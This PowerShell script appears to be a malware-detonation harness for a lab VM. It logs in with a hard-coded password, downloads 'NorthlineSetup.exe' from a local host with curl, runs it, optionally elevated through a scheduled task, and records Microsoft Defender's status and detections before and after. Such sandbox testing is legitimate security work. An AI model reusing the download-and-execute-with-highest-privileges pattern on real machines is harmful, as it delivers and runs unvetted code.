param(
    [switch]$Elevated
)

if ($env:SABLE_ELEVATED -eq '1') { $Elevated = $true }

$ErrorActionPreference = "Continue"
$ProgressPreference = "SilentlyContinue"

$name = 'SABLE-CLEAN'
$pass = ConvertTo-SecureString 'Sable!Clean2026' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('bench', $pass)

$mode = if ($Elevated) { 'elevated' } else { 'user' }
"detonation mode : $mode"

$result = Invoke-Command -VMName $name -Credential $cred -ArgumentList $mode -ScriptBlock {
    param($mode)

    $ErrorActionPreference = "Continue"
    $ProgressPreference = "SilentlyContinue"
    $out = [ordered]@{}
    $out.mode = $mode

    $out.before_realtime  = (Get-MpComputerStatus).RealTimeProtectionEnabled
    $out.before_sig       = (Get-MpComputerStatus).AntivirusSignatureVersion
    $out.before_sigdate   = (Get-MpComputerStatus).AntivirusSignatureLastUpdated
    $out.exclusions       = ((Get-MpPreference).ExclusionPath -join ';')
    $out.before_threats   = @(Get-MpThreatDetection).Count

    $exe = Join-Path $env:TEMP 'NorthlineSetup.exe'
    if (Test-Path $exe) { Remove-Item -Force $exe }
    curl.exe -s -S --max-time 300 -o $exe 'http://192.168.1.151:8099/NorthlineSetup.exe'
    if (-not (Test-Path $exe)) { throw "download failed" }
    $out.bytes = (Get-Item $exe).Length
    $out.fetch_realtime = (Get-MpComputerStatus).RealTimeProtectionEnabled

    $t0 = Get-Date
    if ($mode -eq 'elevated') {
        $cmd = '"' + $exe + '"'
        schtasks /create /tn SABLE-RUN /tr $cmd /sc once /st 00:00 /rl HIGHEST /ru bench /rp 'Sable!Clean2026' /f 2>&1 | Out-Null
        schtasks /run /tn SABLE-RUN 2>&1 | Out-Null
        $deadline = $t0.AddMinutes(12)
        while ((Get-Date) -lt $deadline) {
            if (-not (Get-Process -Name 'NorthlineSetup' -ErrorAction SilentlyContinue)) { break }
            Start-Sleep -Seconds 5
        }
        schtasks /delete /tn SABLE-RUN /f 2>&1 | Out-Null
    } else {
        $p = Start-Process -FilePath $exe -PassThru
        $deadline = $t0.AddMinutes(12)
        while ((Get-Date) -lt $deadline) {
            if ($p.HasExited) { break }
            Start-Sleep -Seconds 5
        }
        if (-not $p.HasExited) { $out.note = 'still running at timeout' }
    }
    $out.seconds = [int]((Get-Date) - $t0).TotalSeconds

    Start-Sleep -Seconds 8
    $out.after_realtime = (Get-MpComputerStatus).RealTimeProtectionEnabled
    $out.after_threats  = @(Get-MpThreatDetection).Count
    $out.detections = @(
        Get-MpThreatDetection | ForEach-Object {
            "{0} | {1} | {2}" -f $_.ThreatID, $_.InitialDetectionTime, ($_.Resources -join ',')
        }
    )
    $out.threat_names = @(
        Get-MpThreat | ForEach-Object { "{0} | {1} | severity {2}" -f $_.ThreatName, $_.ThreatID, $_.SeverityID }
    )
    $out.defender_log = @(
        Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Windows Defender/Operational'; StartTime=$t0} -ErrorAction SilentlyContinue |
        Select-Object -First 20 | ForEach-Object { "{0} {1} id={2}" -f $_.TimeCreated.ToString('HH:mm:ss'), $_.LevelDisplayName, $_.Id }
    )
    [pscustomobject]$out
}

$result | Format-List
